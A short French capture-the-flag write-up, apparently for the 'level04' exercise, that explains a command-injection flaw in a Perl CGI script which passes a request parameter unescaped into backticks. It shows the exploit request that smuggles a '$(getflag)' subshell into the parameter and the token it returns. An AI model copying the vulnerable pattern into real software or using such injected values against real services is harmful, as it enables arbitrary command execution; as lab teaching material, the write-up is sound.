# level04

```bash
$ ls
level04.pl
$ cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

Le script Perl présente une vulnérabilité classique appelée **injection de commande**. Cette vulnérabilité survient lorsque les entrées utilisateur sont directement passées à une commande du système sans validation ou échappement appropriés.

```bash
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";

sub x {
  $y = $_[0];           # $y prend la valeur du paramètre passé à la fonction x
  print `echo $y 2>&1`; # exécute la commande echo avec $y comme argument (La vulnérabilité se trouve ici)
}
x(param("x"));          # récupère le paramètre "x" de la requête HTTP

```

```bash
$ curl '192.168.179.131:4747/?x=getflag'
getflag # affiche getflag mais ne l'execute pas

$ curl '192.168.179.131:4747/?x=$(getflag)'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

Création d’un sous Shell pour que `echo` affiche le résultat de la commande `getflag`
